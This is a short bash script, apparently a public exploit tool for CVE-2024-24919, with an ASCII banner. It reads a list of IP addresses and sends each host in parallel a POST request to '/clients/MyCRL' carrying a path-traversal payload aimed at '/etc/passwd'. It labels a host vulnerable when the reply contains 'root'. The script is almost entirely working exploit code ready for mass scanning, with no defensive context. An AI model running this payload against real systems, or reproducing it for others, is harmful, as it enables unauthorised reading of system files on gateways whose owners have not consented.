#!/bin/bash

CYAN='\033[0;36m'
NC='\033[0m' 
echo -e "${CYAN}"
cat << "EOF"

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ██╗  ██╗ █████╗  ██╗ █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗██║  ██║██╔══██╗███║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝███████║╚██████║╚██║╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ╚════██║ ╚═══██║ ██║ ╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗     ██║ █████╔╝ ██║ █████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝     ╚═╝ ╚════╝  ╚═╝ ╚════╝ 
                    usage ./CVE-2024-24919 -l ips.txt                                                                                                        
EOF
echo -e "${NC}"

contains() {
    string="$1"
    substring="$2"
    if test "${string#*$substring}" != "$string"; then
        return 0    
    else
        return 1    
    fi
}

if [ $# -ne 2 ]; then
    echo -e "\e[91mUsage: $0 -l <filename>\e[0m"
    exit 1
fi

while getopts "l:" opt; do
    case $opt in
        l) ip_file=$OPTARG;;
        \?) echo -e "\e[91mInvalid option: -$OPTARG\e[0m" >&2
            exit 1;;
    esac
done

if [ ! -f "$ip_file" ]; then
    echo "IP file not found: $ip_file"
    exit 1
fi

check_ip() {
    ip=$1
    response=$(curl -k -X POST "https://$ip/clients/MyCRL" --data "aCSHELL/../../../../../../../etc/passwd" 2>/dev/null)
    if contains "$response" "root"; then
       echo -e "\e[91mvulnerable\e[0m - $ip"
    else
        echo -e "\e[34mNot vulnerable\e[0m - $ip"
    fi
}

export -f contains
export -f check_ip

cat "$ip_file" | xargs -P 10 -I {} bash -c 'check_ip "{}"'
